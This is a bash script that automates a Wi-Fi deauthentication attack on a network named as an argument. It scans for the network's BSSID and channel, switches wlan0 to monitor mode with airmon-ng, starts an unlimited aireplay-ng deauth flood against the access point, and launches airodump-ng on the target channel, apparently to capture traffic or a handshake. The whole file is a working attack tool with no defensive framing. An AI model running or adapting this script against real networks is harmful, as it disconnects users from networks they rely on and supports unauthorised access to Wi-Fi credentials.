#!/bin/bash
# Author: Alex && Trev

NETWORK_NAME=$1
JSON="info.json"
SESSION="ATTACK"
WINDOW="attack"

function sleeptime() {
    local sleep_time="$1" 
    sleep $sleep_time 
}

function init() { 
    echo -e "[+] Init"

    echo "$NETWORK_NAME" > data/network.txt
    sudo iwlist wlan0 scan | awk -v essid="$NETWORK_NAME" '/Cell/ {bssid=$5} /ESSID:/ && $0 ~ essid {print bssid}' > data/bssid.txt
    sleeptime 3 
    sudo iwlist wlan0 scan | awk -v essid="$NETWORK_NAME" '/Channel:/ {channel=$1} /ESSID:/ && $0 ~ essid {print channel}' > data/channel.txt
}

function ping() {
    bssid=$(cat data/bssid.txt)
    tmux send-keys -t "$SESSION:$WINDOW.1" "sudo airmon-ng check kill && sudo airmon-ng start wlan0" Enter 
    sleeptime 5 
    tmux send-keys -t "$SESSION:$WINDOW.1" "sudo aireplay-ng -0 0 -a $bssid wlan0mon" Enter 
}

function deauth() {
    echo -e "[+] Killing"
    sleeptime 1
    bssid=$(cat data/bssid.txt)
    channel=$(grep -oP "(?<=Channel:)\d+" data/channel.txt)
    tmux send-keys -t "$SESSION:$WINDOW.2" "sudo airodump-ng -c $channel --bssid $bssid wlan0mon" Enter
}

init
ping
deauth
